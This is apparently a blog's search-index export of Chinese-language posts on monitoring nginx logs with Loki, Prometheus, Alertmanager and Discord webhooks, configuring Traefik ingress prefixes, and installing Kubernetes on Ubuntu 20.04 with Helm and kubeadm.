Loki log資訊做監控。 ","date":"2022-04-03","objectID":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/:0:0","tags":["kubernetes","loki"],"title":"Loki 做監控動作方法","uri":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"流程 flowchart LR Promtail ----\u003e Loki Promtail -- metrics 增加 prometheus 資料 --\u003e Prometheus Prometheus --\u003e AlertManager 主要參照使用 Loki 进行日志监控和报警-阳明的博客|Kubernetes|Istio|Prometheus|Python|Golang|云原生文章，操作中發現現有版本設定有改，但修正也能正常使用。 ","date":"2022-04-03","objectID":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/:1:0","tags":["kubernetes","loki"],"title":"Loki 做監控動作方法","uri":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"實作流程 參考文章 使用 Loki 进行日志监控和报警-阳明的博客|Kubernetes|Istio|Prometheus|Python|Golang|云原生 Kubernetes轻量级日志收集系统Loki-Stack - 吕振江 - 博客园 How to Setup Alerting With Loki - Ruan Bekker’s Blog ","date":"2022-04-03","objectID":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/:2:0","tags":["kubernetes","loki"],"title":"Loki 做監控動作方法","uri":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"設定 loki-stack.yml(helm values.yml) 主要重點在這段 promtail: enabled: true pipelineStages: - match: selector: '{app=\"nginx\"}' stages: - regex: expression: '.*(?P\u003chits\u003eGET /.*)' - metrics: nginx_hits: type: Counter description: \"Total nginx requests\" source: hits config: action: inc pipelineStages可以看相關看官方文件，他這個有點像pipeline 交給後續處理，前面處理失敗，所以後面就不會監控到，可以查看 Grafana 的log 格式調整設定檔內容。可參考:Stages | Grafana Labs loki-stacl.yml loki: enabled: true promtail: enabled: true pipelineStages: - docker: {} - match: selector: '{app=\"nginx\"}' stages: - regex: expression: '.*(?P\u003chits\u003eGET /.*)' - metrics: nginx_hits: type: Counter description: \"Total nginx requests\" source: hits config: action: inc fluent-bit: enabled: false grafana: enabled: true sidecar: datasources: enabled: true image: tag: 8.3.5 prometheus: enabled: true server: persistentVolume: enabled: false alertmanager: persistentVolume: enabled: false filebeat: enabled: false filebeatConfig: filebeat.yml: | # logging.level: debug filebeat.inputs: - type: container paths: - /var/log/containers/*.log processors: - add_kubernetes_metadata: host: ${NODE_NAME} matchers: - logs_path: logs_path: \"/var/log/containers/\" output.logstash: hosts: [\"logstash-loki:5044\"] logstash: enabled: false image: grafana/logstash-output-loki imageTag: 1.0.1 filters: main: |- filter { if [kubernetes] { mutate { add_field =\u003e { \"container_name\" =\u003e \"%{[kubernetes][container][name]}\" \"namespace\" =\u003e \"%{[kubernetes][namespace]}\" \"pod\" =\u003e \"%{[kubernetes][pod][name]}\" } replace =\u003e { \"host\" =\u003e \"%{[kubernetes][node][name]}\"} } } mutate { remove_field =\u003e [\"tags\"] } } outputs: main: |- output { loki { url =\u003e \"http://loki:3100/loki/api/v1/push\" #username =\u003e \"test\" #password =\u003e \"test\" } # stdout { codec =\u003e rubydebug } } helm upgrade --install loki grafana/loki-stack -f loki-stack.yml 接下來用 Grafana 查詢 Promethus 看有沒有抓到資料，有資料代表成功了。原本以為可能要加時間控制抓5分鐘內，但我後來發現好像不需要做這件事，通知會在超過時間之前就發解決，可能後續我在看文件有沒有預設會抓多久。 ","date":"2022-04-03","objectID":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/:3:0","tags":["kubernetes","loki"],"title":"Loki 做監控動作方法","uri":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"架設 alertmanger-discord 建立 deployment 和 service 後，設定好 webhook 就能使用了。 apiVersion: apps/v1 kind: Deployment metadata: name: alertmanager-discord-deployment labels: app: alertmanager-discord spec: replicas: 1 selector: matchLabels: app: alertmanager-discord template: metadata: labels: app: alertmanager-discord spec: containers: - name: alertmanager-discord image: benjojo/alertmanager-discord ports: - containerPort: 9094 env: - name: DISCORD_WEBHOOK value: https://discord.com/api/webhooks/*** --- apiVersion: v1 kind: Service metadata: name: alertmanager-discord spec: selector: app: alertmanager-discord ports: - protocol: TCP port: 9094 可以kubectl get svc查看 service 的IP，可以簡單做curl IP:9094看有沒有失敗訊息，如果有可以確認 Label 有沒有打錯字，可以查看 endpoint 是不是有IP。 ","date":"2022-04-03","objectID":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/:4:0","tags":["kubernetes","loki"],"title":"Loki 做監控動作方法","uri":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"設定 alertmanger 通知 可以參考:helm-charts/values.yaml at main · prometheus-community/helm-charts 我查看裡面有Kuberetes@CRDS可以用，但我這個還不熟悉，之後在接觸。感覺用這個就不需要設定檔案，之前Traefik 有用到 CRDS。 可看prometheus-operator/alerting.md at main · prometheus-operator/prometheus-operator，之後會做簡單嘗試。 其實會寫對照設定還滿簡單的，查看我之前在動物機設定，根本可以抄。 動物機設定 global: #163服务器 smtp_smarthost: 'smtp.qq.com:465' #发邮件的邮箱 smtp_from: 'your-email@foxmail.com' #发邮件的邮箱用户名，也就是你的邮箱　smtp_auth_username: 'your-email@foxmail.com' #发邮件的邮箱密码 smtp_auth_password: 'your-password' #进行tls验证 smtp_require_tls: true route: group_by: ['alertname'] group_wait: 10s group_interval: 10s repeat_interval: 60m receiver: discord_webhook receivers: - name: 'discord_webhook' webhook_configs: - url: 'http://192.168.1.203:9094' loki-stack.yml 的 prometheus 設定 prometheus: enabled: true server: persistentVolume: enabled: false alertmanager: config: receivers: - name: 'discord_webhook' webhook_configs: - url: 'http://alertmanger-discord:9094' persistentVolume: enabled: false ","date":"2022-04-03","objectID":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/:5:0","tags":["kubernetes","loki"],"title":"Loki 做監控動作方法","uri":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"設定 Prometheus 監控自訂的 metrics 官方建議使用 alerting_rules.yml去做設定，不建議使用alerts。 參考:helm-charts/values.yaml at main · prometheus-community/helm-charts 但應該也是有相對應 CRD 去做調整。因為我還沒學到那邊，我覺得我先不使用這方式去做。 prometheus: enabled: true server: persistentVolume: enabled: false serverFiles: alerting_rules.yml: groups: - name: example rules: - alert: nginx_hits expr: promtail_custom_nginx_hits for: 30s annotations: summary: \"Instance {{ $labels.instance }} nginx hits\" description: \"{{ $labels.instance }} of job {{ $labels.job }} has been nginx hits for more than 30 seconds.\" alertmanagerFiles: alertmanager.yml: receivers: - name: 'default-receiver' webhook_configs: - url: 'http://alertmanager-discord:9094' persistentVolume: enabled: false 這邊我們達成使用 Loki 針對 Nginx 訪問直接做跳出提醒，做出簡單很廢的實例，這邊可以改寫正規方法，可以抓到自己想要錯誤內容，使用上難度也沒很高。 ","date":"2022-04-03","objectID":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/:6:0","tags":["kubernetes","loki"],"title":"Loki 做監控動作方法","uri":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"DEBUG 蒐集網路上一些 debug 方法: alertmanager - HackMD 可以打 Alertmanager 測試看看，可以看看 discord 有沒有收到通知。沒有可能要繼續找…，我後來發現是我 alertmanagerFile: 裡面 service 打錯，所以沒有收到通知。😅 alerts1='[ { \"labels\": { \"alertname\": \"test name\", \"severity\" : \"Warning\" }, \"annotations\": { \"Threshold\": \"\u003c= 2\", \"dashboard\": \"test\", \"description\":\"test\", \"infoURL\":\"test\", \"summary\":\"this is a test mail\", \"value\":\"2\" } } ]' curl -XPOST -d \"$alerts1\" http://\u003calertmanager url\u003e/api/v1/alerts Prometheus 搭配 Alertmanager 發送警示 - Yowko’s Notes 修改 proxy_url 設定，可以使用 Fiddler 等等相關工具去調整。我目前 Alertmanger 沒有問題，看到這種 debug 特別紀錄一下。 receivers: - name: 'null' # 不做事 - name: 'email' email_configs: # 指定 email config 來處理 - to: 'xxx@yowko.com' - name: 'webhook' webhook_configs: # 指定 webhook config 來處理 - url: 'http://blog.yowko.com' http_config: proxy_url: 'http://192.168.80.3:8866' # proxy 是個人 debug 用途 ","date":"2022-04-03","objectID":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/:7:0","tags":["kubernetes","loki"],"title":"Loki 做監控動作方法","uri":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"最後完成 loki-stack.yml(helm value.yml) 把最後實作重新貼到這邊 loki: enabled: true promtail: enabled: true pipelineStages: - match: selector: '{app=\"nginx\"}' stages: - regex: expression: '.*(?P\u003chits\u003eGET /.*)' - metrics: nginx_hits: type: Counter description: \"Total nginx requests\" source: hits config: action: inc fluent-bit: enabled: false grafana: grafana.ini: server: root_url: \"http://localhost:3000/grafana\" enabled: true sidecar: datasources: enabled: true image: tag: 8.3.5 prometheus: enabled: true server: persistentVolume: enabled: false serverFiles: alerting_rules.yml: groups: - name: example rules: - alert: nginx_hits expr: promtail_custom_nginx_hits for: 30s annotations: summary: \"Instance {{ $labels.instance }} nginx hits\" description: \"{{ $labels.instance }} of job {{ $labels.job }} has been nginx hits for more than 30 seconds.\" alertmanagerFiles: alertmanager.yml: receivers: - name: 'default-receiver' webhook_configs: - url: 'http://alertmanager-discord:9094' persistentVolume: enabled: false filebeat: enabled: false filebeatConfig: filebeat.yml: | # logging.level: debug filebeat.inputs: - type: container paths: - /var/log/containers/*.log processors: - add_kubernetes_metadata: host: ${NODE_NAME} matchers: - logs_path: logs_path: \"/var/log/containers/\" output.logstash: hosts: [\"logstash-loki:5044\"] logstash: enabled: false image: grafana/logstash-output-loki imageTag: 1.0.1 filters: main: |- filter { if [kubernetes] { mutate { add_field =\u003e { \"container_name\" =\u003e \"%{[kubernetes][container][name]}\" \"namespace\" =\u003e \"%{[kubernetes][namespace]}\" \"pod\" =\u003e \"%{[kubernetes][pod][name]}\" } replace =\u003e { \"host\" =\u003e \"%{[kubernetes][node][name]}\"} } } mutate { remove_field =\u003e [\"tags\"] } } outputs: main: |- output { loki { url =\u003e \"http://loki:3100/loki/api/v1/push\" #username =\u003e \"test\" #password =\u003e \"test\" } # stdout { codec =\u003e rubydebug } } helm upgrade --install loki grafana/loki-stack -f loki-stack.yml ","date":"2022-04-03","objectID":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/:8:0","tags":["kubernetes","loki"],"title":"Loki 做監控動作方法","uri":"/blog/posts/Loki-%E5%81%9A%E7%9B%A3%E6%8E%A7%E5%8B%95%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"參考:kubernetes部署loki日志系统_willblog的博客-CSDN博客_k8s安装loki helm upgrade --install loki grafana/loki-stack \\ --namespace=loki-stack \\ --create-namespace \\ --set grafana.enabled=true \\ --set prometheus.enabled=true \\ --set prometheus.server.persistentVolume.enabled=false \\ --set prometheus.alertmanager.persistentVolume.enabled=false # 假如有設定反向代理需要注意 # --set grafana.grafana\\\\.ini.server.root_url='http://localhost:3000/grafana' # 設定 Grafana Service 為 NodePort kubectl -n loki-stack patch svc loki-grafana -p '{\"spec\": {\"type\": \"NodePort\"}}' # 登入 Grafana 密碼\\ kubectl get secret --namespace loki-stack loki-grafana -o jsonpath=\"{.data.admin-password}\" | base64 --decode ; echo 這邊快速完成佈置。後面有在 value.yml 配置，可參考後面筆記。 ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/:0:0","tags":["kubernetes","loki"],"title":"使用 Helm 快速安裝 Loki","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/"},{"categories":["Kubernetes"],"content":"rewrite/prefix 反向代理設定 做反向代理做 rewrite/prefix 可能需要注意的事情，因為 Prefix 到 ReverseProxy 會用一般 url 連到 Server，可以看到下圖會比較清楚，但很多網站大多數都會做 domain/path/ 前面會加domain(ip)，沒強制是還好，如./dir/a.html 沒固定連結，但這種也不是很好的做法，大多網站都會強制固定link連結。 graph LR Client --\u003e|http://ip/prometheus| ReverseProxy ReverseProxy --\u003e |http://ip/| Server Server --\u003e |redirect http://ip/login | ReverseProxy ReverseProxy --\u003e | http://ip/login|Client 官網範例，因為我不是用 ingress ，我是用 Traefik 來做反向代理，所以就不需要寫這一段 # 官網範例 # https://github.com/grafana/helm-charts/tree/main/charts/grafana ingress: enabled: true annotations: kubernetes.io/ingress.class: \"nginx\" nginx.ingress.kubernetes.io/rewrite-target: /$1 nginx.ingress.kubernetes.io/use-regex: \"true\" path: /grafana/?(.*) hosts: - k8s.example.dev grafana.ini: server: root_url: http://localhost:3000/grafana # this host can be localhost 因為我不是用 nginx controller ，所以我就稍微改了一下方法，上面nginx controller 我不需要設定。 helm upgrade --install loki grafana/loki-stack \\ --set grafana.enabled=true \\ --set prometheus.enabled=true \\ --set prometheus.server.persistentVolume.enabled=false \\ --set prometheus.alertmanager.persistentVolume.enabled=false \\ --set grafana.grafana\\\\.ini.server.root_url='http://localhost:3000/grafana' traefik-ingress.yml apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: traefik-ingress namespace: default annotations: kubernetes.io/ingress.class: traefik nginx.ingress.kubernetes.io/ssl-redirect: \"false\" traefik.ingress.kubernetes.io/router.middlewares: default-testpath-prefix@kubernetescrd,default-grafana-prefix@kubernetescrd spec: rules: - http: paths: - pathType: Prefix path: \"/testpath\" backend: service: name: nginx port: number: 80 - http: paths: - pathType: Prefix path: \"/grafana\" backend: service: name: loki-grafana port: number: 80 --- apiVersion: traefik.containo.us/v1alpha1 kind: Middleware metadata: name: testpath-prefix namespace: default spec: stripPrefix: prefixes: - /testpath --- apiVersion: traefik.containo.us/v1alpha1 kind: Middleware metadata: name: grafana-prefix namespace: default spec: stripPrefix: prefixes: - /grafana 這邊因為我 ingress 跨 namespace 會抓不到 Server，聽說 ingressroute 可以跨 namespace，相同 namespace 沒有這個問題，所以我先用相同 namespace。 ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/:1:0","tags":["kubernetes","loki"],"title":"使用 Helm 快速安裝 Loki","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/"},{"categories":["Kubernetes"],"content":"彩蛋 使用 Loki 收集 Traefik 日志 - 云+社区 - 腾讯云 helm-charts/charts/grafana at main · grafana/helm-charts ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/:1:1","tags":["kubernetes","loki"],"title":"使用 Helm 快速安裝 Loki","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/"},{"categories":["Kubernetes"],"content":"traefik 打開一般 log command 加上設定就能執行，參考:使用 Loki 收集 Traefik 日志 - 云+社区 - 腾讯云 。 containers: - args: - --accesslog=true - --accesslog.format=json helm traefik 設定 helm upgrade traefik traefik/traefik --set service.type=NodePort --set logs.access.enabled=true ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/:2:0","tags":["kubernetes","loki"],"title":"使用 Helm 快速安裝 Loki","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/"},{"categories":["Kubernetes"],"content":"Grafana 可以查詢 ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/:3:0","tags":["kubernetes","loki"],"title":"使用 Helm 快速安裝 Loki","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Helm-%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%9D-Loki/"},{"categories":["Kubernetes"],"content":"Traefik Ingress Controller 設定花了不少時間，簡單小記一些東西。 使用前可以用這個看你的 Kubernetes 支援哪些 API，撰寫前記得看網路上資源是不是有一致。有些版本更新會不一樣。 kubectl api-resource 文章參照這篇Install Traefik Ingress Controller on Kubernetes using Helm 3 | Traefik Ingress Kubernetes helm - YouTube實作。 內容:Install Traefik Ingress Controller on Kubernetes using Helm 3 ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/:0:0","tags":["kubernetes"],"title":"使用 Helm 快速搭建 Traefik Ingress Controller","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/"},{"categories":["Kubernetes"],"content":"安裝 Helm curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash # 載入現有的指令 source \u003c(helm completion bash) 其他可以參考Helm | Helm Completion Bash ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/:1:0","tags":["kubernetes"],"title":"使用 Helm 快速搭建 Traefik Ingress Controller","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/"},{"categories":["Kubernetes"],"content":"helm 部署 Traefik # 加入 Repo helm repo add traefik https://helm.traefik.io/traefik helm repo update kubectl create ns traefik-v2 ## 這邊後續做 Traefik Ingress，所以後面操作我會使用預設(default) namespace 做操作 helm install --namespace=traefik-v2 \\ traefik traefik/traefik helm -n traefik-v2 get values traefik -a helm -n traefik-v2 upgrade traefik traefik/traefik --set service.type=NodePort --set ports.traefik.expose=true #--set rbac.namespaced=true --set providers.kubernetesCRD.allowCrossNamespace=true 這邊我使用--set 去設定 values.yml，後面也可以用 values.yml 去install/upgrade K8s服務，但我目前沒有找到快速建置 values.yml方法，其實我在想是不是 helm pull xxx 下來管理檔案室最好作法?後續再研究。 ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/:2:0","tags":["kubernetes"],"title":"使用 Helm 快速搭建 Traefik Ingress Controller","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/"},{"categories":["Kubernetes"],"content":"expose dashboard(測試失敗) 需要看你的namespace 需要補上-n namespace。 kubectl port-forward $(kubectl get pods --selector \"app.kubernetes.io/name=traefik\" --output=name) 9000:9000 不過我上面都會 404，目前沒有測成功… 有查詢相關資料 还不会Traefik？看这篇文章就够了！-51CTO.COM Helm Get Values For a Helm Release {Review Revisions} SSH Tunneling (Port Forwarding) 詳解 · John Engineering Stuff RedirectRegex | Traefik | v2.3 traefik 9.12.0 · traefik/traefik http://192.168.0.6:8080/api/http/routers，可用相關API路徑程式查看有哪些Service，因為。 ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/:3:0","tags":["kubernetes"],"title":"使用 Helm 快速搭建 Traefik Ingress Controller","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/"},{"categories":["Kubernetes"],"content":"設定 ingress(prefix) 這邊我因為測試，所以把traefik 用在 default namespace。 很多範例都有講到，但很多都是 ingress 設定，多子網域設定，但沒有講道 prefix 設定。 我原本有找到 prefix，但發現倒到 nginx-web pod 都會 404 。 後來我仔細看一下，多了這個nginx.ingress.kubernetes.io/rewrite-target: /，以下是官方 nginx 設定。 apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: minimal-ingress annotations: nginx.ingress.kubernetes.io/rewrite-target: / spec: ingressClassName: nginx-example rules: - http: paths: - path: /testpath pathType: Prefix backend: service: name: test port: number: 80 Traefik v1 也是用 rewrite，但是 v2 就沒有看到 rewrite 關鍵字，後來找到 stripPrefix 關鍵字才找到方法， 參考:Introduction to Traefik v2 Ingress Controller in Jelastic Kubernetes | Jelastic。 apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: traefik-ingress namespace: default annotations: kubernetes.io/ingress.class: traefik nginx.ingress.kubernetes.io/ssl-redirect: \"false\" traefik.ingress.kubernetes.io/router.middlewares: default-testpath-prefix@kubernetescrd spec: rules: - http: paths: - pathType: Prefix path: \"/testpath\" backend: service: name: nginx port: number: 80 --- apiVersion: traefik.containo.us/v1alpha1 kind: Middleware metadata: name: testpath-prefix namespace: default spec: stripPrefix: prefixes: - /testpath 簡單記錄重點: 設定 Middleware 和 Ingress Ingress 上的 traefik.ingress.kubernetes.io/router.middlewares 需要設定namespace-middleware@kubernetescrd Middleware 需要設定 名稱(如:testpath-prefix) prefixes 要去掉路徑做設定 ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/:4:0","tags":["kubernetes"],"title":"使用 Helm 快速搭建 Traefik Ingress Controller","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/"},{"categories":["Kubernetes"],"content":"強制使用 TLS 連線 traefik.ingress.kubernetes.io/router.tls: \"true\" ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/:4:1","tags":["kubernetes"],"title":"使用 Helm 快速搭建 Traefik Ingress Controller","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/"},{"categories":["Kubernetes"],"content":"設定別的 namespace (測試失敗) 可能用Service · Kubernetes 中文指南——云原生应用架构实战手册 Ingress 不能跨 namespace，但有查到 Ingressroute 可以跨 namespace。但我有找到用 workaound 方法去解決跟 namespace 方法，是使用 ExtenalName ，可參考simple demo on routing cross namespace by traefik ingress, docker for mac。 測試失敗…，Traefik做的時候，Ingress 設定不上去 Service。 參考網路文章 Ingress traffic | Linkerd Ingress rules in different Kubernetes namespaces | Vincent-Philippe Lauzon’s simple demo on routing cross namespace by traefik ingress, docker for mac clusterIP 無法 Ping，然怪我怎麼 Ping都失敗，但其實 curl 都是正常的\\ Kubernetes网络的iptables模式和ipvs模式支持ping分析 - 小家电维修 - 博客园 ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/:4:2","tags":["kubernetes"],"title":"使用 Helm 快速搭建 Traefik Ingress Controller","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/"},{"categories":["Kubernetes"],"content":"最後設定 traefik-ingress.yml 這有關最後筆記，相關 Grafana 可以看 Loki配置會一起用 apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: traefik-ingress namespace: default annotations: kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/router.tls: \"true\" traefik.ingress.kubernetes.io/router.middlewares: default-testpath-prefix@kubernetescrd,default-grafana-prefix@kubernetescrd spec: rules: - http: paths: - pathType: Prefix path: \"/testpath\" backend: service: name: nginx port: number: 80 - http: paths: - pathType: Prefix path: \"/grafana\" backend: service: name: loki-grafana port: number: 80 --- apiVersion: traefik.containo.us/v1alpha1 kind: Middleware metadata: name: testpath-prefix namespace: default spec: stripPrefix: prefixes: - /testpath --- apiVersion: traefik.containo.us/v1alpha1 kind: Middleware metadata: name: grafana-prefix namespace: default spec: stripPrefix: prefixes: - /grafana ","date":"2022-04-03","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/:4:3","tags":["kubernetes"],"title":"使用 Helm 快速搭建 Traefik Ingress Controller","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-helm-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-Traefik-Ingress-Controller/"},{"categories":["Kubernetes"],"content":"之前都是在VM測試用Ubuntu 18.04 快速用 apt 安裝，但發現 20.04 沒有這麼順利，所以這邊就簡單照網路操作安裝，順便紀錄一下。 ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:0:0","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"安裝 K8S ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:0","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"安裝kubelet, kubeadm and kubectl sudo apt update sudo apt -y install curl apt-transport-https curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add - echo \"deb https://apt.kubernetes.io/ kubernetes-xenial main\" | sudo tee /etc/apt/sources.list.d/kubernetes.list sudo apt update sudo apt -y install vim git curl wget kubelet kubeadm kubectl sudo apt-mark hold kubelet kubeadm kubectl 確認結果 kubectl version --client \u0026\u0026 kubeadm version ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:1","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"關掉swap sudo sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab sudo swapoff -a ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:2","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"設定 kernel modules # Enable kernel modules sudo modprobe overlay sudo modprobe br_netfilter # Add some settings to sysctl sudo tee /etc/sysctl.d/kubernetes.conf\u003c\u003cEOF net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward = 1 EOF # Reload sysctl sudo sysctl --system 確認執行結果 lsmod | grep br_netfilter 